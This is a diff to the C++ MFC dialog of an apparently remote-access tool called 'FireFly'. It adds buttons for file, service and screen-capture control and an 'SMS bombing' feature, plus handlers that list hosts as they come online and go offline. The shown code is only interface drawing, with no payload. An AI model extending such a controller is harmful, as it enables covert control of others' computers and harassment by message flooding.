@@ -16,6 +16,11 @@
 #define IDC_MAINPAGE_BT	  IDC_BASE+5  //主页
 #define IDC_PROC_MANAGE_BT  IDC_BASE+6 //进程管理
 #define IDC_REMOTECMD_BT	IDC_BASE+7 //远程CMD
+#define IDC_FILE_BT			IDC_BASE+8 //文件管理
+#define IDC_SERVICE_BT		IDC_BASE+9 //服务管理
+#define IDC_SCREEN_BT		IDC_BASE+10 //屏幕截取
+#define IDC_SMS_BT			IDC_BASE+11 //短信轰炸
+#define IDC_ME_BT			IDC_BASE+12 //关于我
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -45,6 +50,7 @@ CFireFlyDlg::CFireFlyDlg(CWnd* pParent /*=NULL*/)
 	m_iCommandButtonPushed=-1;
 	m_iListHover=-1;
 	m_iListPress=-1;
+	m_bUpdataListView=FALSE;
 	m_rcTime.left=270,m_rcTime.top=578,m_rcTime.right=460,m_rcTime.bottom=596;
 	//文件图片管理类的加载方式
 	//pImage=CSkinManager::GetInstance()->GetSkinItem(L"bkg.jpg");
@@ -69,6 +75,11 @@ CFireFlyDlg::CFireFlyDlg(CWnd* pParent /*=NULL*/)
 	CMemoryImage::GetInstance()->ImageFromResource(IDB_LISTPRESS);//ListView鼠标按下
 	CMemoryImage::GetInstance()->ImageFromResource(IDB_PROC_MANAGE);//进程管理
 	CMemoryImage::GetInstance()->ImageFromResource(IDB_REMOTECMD);//远程CMD
+	CMemoryImage::GetInstance()->ImageFromResource(IDB_FILE);//文件管理
+	CMemoryImage::GetInstance()->ImageFromResource(IDB_SERVICE);//服务管理
+	CMemoryImage::GetInstance()->ImageFromResource(IDB_SCREEN);//屏幕截取
+	CMemoryImage::GetInstance()->ImageFromResource(IDB_SMS);//短信轰炸
+	CMemoryImage::GetInstance()->ImageFromResource(IDB_ME);//关于我
 }
 
 void CFireFlyDlg::DoDataExchange(CDataExchange* pDX)
@@ -87,6 +98,8 @@ BEGIN_MESSAGE_MAP(CFireFlyDlg, CDialogEx)
 	ON_WM_LBUTTONDOWN()
 	ON_WM_LBUTTONUP()
 	ON_WM_TIMER()
+	ON_MESSAGE(WM_ONLINE,&CFireFlyDlg::MyOnline) //自定义上线消息
+	ON_MESSAGE(WM_OFFLINE,&CFireFlyDlg::MyOffline) //自定义下线消息
 END_MESSAGE_MAP()
 
 
@@ -197,26 +210,26 @@ void CFireFlyDlg::OnPaint()
 
 	//ListView标题
 	RectF ListViewTitleRect;
-	SolidBrush ListViewTitlebrush((ARGB)Color::Black);
+	SolidBrush Blackbrush((ARGB)Color::Black);
 	CString sListViewTitleName = L"IP地址";
 	TitleRect.X=10, TitleRect.Y=117; TitleRect.Width = 50; TitleRect.Height = 17;
-	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &ListViewTitlebrush);
+	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &Blackbrush);
 
 	sListViewTitleName = L"计算机名";
 	TitleRect.X=150, TitleRect.Y=117; TitleRect.Width = 150; TitleRect.Height = 17;
-	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &ListViewTitlebrush);
+	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &Blackbrush);
 
 	sListViewTitleName = L"操作系统";
 	TitleRect.X=400, TitleRect.Y=117; TitleRect.Width = 150; TitleRect.Height = 17;
-	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &ListViewTitlebrush);
+	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &Blackbrush);
 
 	sListViewTitleName = L"内存";
 	TitleRect.X=600, TitleRect.Y=117; TitleRect.Width = 150; TitleRect.Height = 17;
-	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &ListViewTitlebrush);
+	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &Blackbrush);
 
 	sListViewTitleName = L"地理位置";
 	TitleRect.X=700, TitleRect.Y=117; TitleRect.Width = 150; TitleRect.Height = 17;
-	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &ListViewTitlebrush);
+	graphics.DrawString(sListViewTitleName.GetBuffer(), sListViewTitleName.GetLength(),&font, TitleRect,&stringFormat, &Blackbrush);
 
 	//绘制底边栏信息
 	SolidBrush Bottombrush((ARGB)Color::Black);
@@ -277,6 +290,26 @@ void CFireFlyDlg::OnPaint()
 	BottomRect.X=177,BottomRect.Y=95-7,BottomRect.Width=70,TitleRect.Height=30;
 	graphics.DrawString(sFunName.GetBuffer(), sFunName.GetLength(),&font, BottomRect,&stringFormat, &Funbrush);
 
+	sFunName=L"服务管理";
+	BottomRect.X=260,BottomRect.Y=95-7,BottomRect.Width=70,TitleRect.Height=30;
+	graphics.DrawString(sFunName.GetBuffer(), sFunName.GetLength(),&font, BottomRect,&stringFormat, &Funbrush);
+
+	sFunName=L"文件管理";
+	BottomRect.X=340,BottomRect.Y=95-7,BottomRect.Width=70,TitleRect.Height=30;
+	graphics.DrawString(sFunName.GetBuffer(), sFunName.GetLength(),&font, BottomRect,&stringFormat, &Funbrush);
+
+	sFunName=L"屏幕截取";
+	BottomRect.X=420,BottomRect.Y=95-7,BottomRect.Width=70,TitleRect.Height=30;
+	graphics.DrawString(sFunName.GetBuffer(), sFunName.GetLength(),&font, BottomRect,&stringFormat, &Funbrush);
+
+	sFunName=L"短信轰炸";
+	BottomRect.X=500,BottomRect.Y=95-7,BottomRect.Width=70,TitleRect.Height=30;
+	graphics.DrawString(sFunName.GetBuffer(), sFunName.GetLength(),&font, BottomRect,&stringFormat, &Funbrush);
+
+	sFunName=L"关于我";
+	BottomRect.X=587,BottomRect.Y=95-7,BottomRect.Width=70,TitleRect.Height=30;
+	graphics.DrawString(sFunName.GetBuffer(), sFunName.GetLength(),&font, BottomRect,&stringFormat, &Funbrush);
+
 	//绘制功能按钮,如果是经过状态 还需要再上面贴一个图片 >IDC_MAINPAGE_BT功能类按钮才需要绘制背景
 	if(m_iCommandButtonHovering>=IDC_MAINPAGE_BT) //如果是鼠标盘旋
 	{
@@ -289,6 +322,37 @@ void CFireFlyDlg::OnPaint()
 		Image *pBackPushed = CMemoryImage::GetInstance()->ImageFromResource(IDB_PUSHED);
 		m_rcBtn[m_iCommandButtonPushed].DrawButton(graphics,pBackPushed);
 	}
+
+	//更新ListView主机列表
+	if(m_bUpdataListView)
+	{
+		for(int i=0;i<g_ServArray.GetSize();i++)
+		{
+			CString sIP=g_ServArray.GetAt(i).ip;     //IP
+			CString sComputerName=g_ServArray.GetAt(i).ComputerName; //主机名
+			CString sOS=m_custom.MyGetOS(g_ServArray.GetAt(i).os);   //操作系统
+			CString sMemory;
+			sMemory.Format(_T("%d MB"),g_ServArray.GetAt(i).memsize); //内存大小
+			CString sLocation=L"局域网";                              //局域网目前还无法实现
+
+			BottomRect.X=10,BottomRect.Y=140+23*i,BottomRect.Width=900,TitleRect.Height=23;
+			graphics.DrawString(sIP.GetBuffer(), sIP.GetLength(),&font, BottomRect,&stringFormat, &Blackbrush);
+
+			BottomRect.X=150,BottomRect.Y=140+23*i,BottomRect.Width=900,TitleRect.Height=23;
+			graphics.DrawString(sComputerName.GetBuffer(), sComputerName.GetLength(),&font, BottomRect,&stringFormat, &Blackbrush);
+
+			BottomRect.X=400,BottomRect.Y=140+23*i,BottomRect.Width=900,TitleRect.Height=23;
+			graphics.DrawString(sOS.GetBuffer(), sOS.GetLength(),&font, BottomRect,&stringFormat, &Blackbrush);
+
+			BottomRect.X=600,BottomRect.Y=140+23*i,BottomRect.Width=900,TitleRect.Height=23;
+			graphics.DrawString(sMemory.GetBuffer(), sMemory.GetLength(),&font, BottomRect,&stringFormat, &Blackbrush);
+
+			BottomRect.X=700,BottomRect.Y=140+23*i,BottomRect.Width=900,TitleRect.Height=23;
+			graphics.DrawString(sLocation.GetBuffer(), sLocation.GetLength(),&font, BottomRect,&stringFormat, &Blackbrush);
+		}
+	}
+
+	//不调用基类 messagebox在对话框后面？？？
 	CDialogEx::OnPaint();
 
 }
@@ -381,6 +445,41 @@ int CFireFlyDlg::OnCreate(LPCREATESTRUCT lpCreateStruct)
 	rtButton.bottom=38+48;
 	dButton.CreateButton(_T("远程CMD"),&rtButton,this,CMemoryImage::GetInstance()->GetImage(IDB_REMOTECMD),1,IDC_REMOTECMD_BT);
 	m_rcBtn[IDC_REMOTECMD_BT]=dButton;
+
+	rtButton.left=25+80+80+80;
+	rtButton.top=38;
+	rtButton.right=25+48+80+80+80;
+	rtButton.bottom=38+48;
+	dButton.CreateButton(_T("服务管理"),&rtButton,this,CMemoryImage::GetInstance()->GetImage(IDB_SERVICE),1,IDC_SERVICE_BT);
+	m_rcBtn[IDC_SERVICE_BT]=dButton;
+
+	rtButton.left=25+80+80+80+80;
+	rtButton.top=38;
+	rtButton.right=25+48+80+80+80+80;
+	rtButton.bottom=38+48;
+	dButton.CreateButton(_T("文件管理"),&rtButton,this,CMemoryImage::GetInstance()->GetImage(IDB_FILE),1,IDC_FILE_BT);
+	m_rcBtn[IDC_FILE_BT]=dButton;
+
+	rtButton.left=25+80+80+80+80+80;
+	rtButton.top=38;
+	rtButton.right=25+48+80+80+80+80+80;
+	rtButton.bottom=38+48;
+	dButton.CreateButton(_T("屏幕截取"),&rtButton,this,CMemoryImage::GetInstance()->GetImage(IDB_SCREEN),1,IDC_SCREEN_BT);
+	m_rcBtn[IDC_SCREEN_BT]=dButton;
+
+	rtButton.left=25+80+80+80+80+80+80;
+	rtButton.top=38;
+	rtButton.right=25+48+80+80+80+80+80+80;
+	rtButton.bottom=38+48;
+	dButton.CreateButton(_T("短信轰炸"),&rtButton,this,CMemoryImage::GetInstance()->GetImage(IDB_SMS),1,IDC_SMS_BT);
+	m_rcBtn[IDC_SMS_BT]=dButton;
+
+	rtButton.left=25+80+80+80+80+80+80+80;
+	rtButton.top=38;
+	rtButton.right=25+48+80+80+80+80+80+80+80;
+	rtButton.bottom=38+48;
+	dButton.CreateButton(_T("关于我"),&rtButton,this,CMemoryImage::GetInstance()->GetImage(IDB_ME),1,IDC_ME_BT);
+	m_rcBtn[IDC_ME_BT]=dButton;
 
 	//下边栏时间定时器
 	//SetTimer(1,1000,NULL);
@@ -584,6 +683,7 @@ BOOL CFireFlyDlg::OnCommand(WPARAM wParam, LPARAM lParam)
 				MessageBoxW(L"主页",0,0);
 			}
 			break;
+
 	}
 	return CDialogEx::OnCommand(wParam, lParam);
 }
@@ -594,4 +694,58 @@ void CFireFlyDlg::OnTimer(UINT_PTR nIDEvent)
 	this->InvalidateRect(m_rcTime);
 	//bUpdateTime=TRUE;
 	CDialogEx::OnTimer(nIDEvent);
+}
+
+
+//上下线实际是一样的，都是刷新ListView 全部 主机都重绘一遍。应该有更好的办法。
+LRESULT CFireFlyDlg::MyOnline(WPARAM wParam,LPARAM lParam)
+{
+	CRect rcListView;
+	rcListView.left=0;
+	rcListView.top=138;
+	rcListView.right=900;
+	rcListView.bottom=578;
+	m_bUpdataListView=TRUE;
+	InvalidateRect(rcListView);
+	//GetListCtrl().InsertItem(idx,sitem.ip);
+	//GetListCtrl().SetItemText(idx,1,sitem.ComputerName);
+	//GetListCtrl().SetItemText(idx,2,m_some.MyGetOS(sitem.os));
+	//CString mm;
+	//mm.Format(_T("%d MB"),sitem.memsize);
+	//GetListCtrl().SetItemText(idx,3,mm);
+	return 0;
+}
+
+LRESULT CFireFlyDlg::MyOffline(WPARAM wParam,LPARAM lParam)
+{
+	int idx=(int)lParam;
+	g_ServArray.RemoveAt(idx);
+
+	CRect rcListView;
+	rcListView.left=0;
+	rcListView.top=138;
+	rcListView.right=900;
+	rcListView.bottom=578;
+	m_bUpdataListView=TRUE;
+	InvalidateRect(rcListView);
+
+	//if(m_Process!=NULL)
+	//{
+	//	m_Process->OnCancel();
+
+	//}
+
+	//if(m_CmdShell!=NULL)
+	//{
+	//	m_CmdShell->OnCancel();
+
+	//}
+
+	//if(m_SvcManage!=NULL)
+	//{
+	//	m_SvcManage->OnCancel();
+
+	//}
+
+	return 0;
 }
